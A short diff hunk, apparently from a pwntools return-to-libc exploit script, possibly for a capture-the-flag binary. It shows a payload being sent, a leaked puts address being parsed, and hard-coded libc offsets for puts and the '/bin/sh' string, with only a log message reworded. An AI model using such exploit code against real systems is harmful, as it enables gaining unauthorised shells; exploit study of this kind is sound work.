@@ -348,7 +348,7 @@ pld += p64(addr_main) # ret2main
 p.sendline(pld) # send payload
 
 puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
-log.info('Addr puts (GOT) leak : {}'.format(hex(puts_leak))) # print address puts leaked
+log.info('Memory addr puts leak : {}'.format(hex(puts_leak))) # print address puts leaked
 
 libc_puts = 0x06f690
 libc_binsh = 0x18cd17
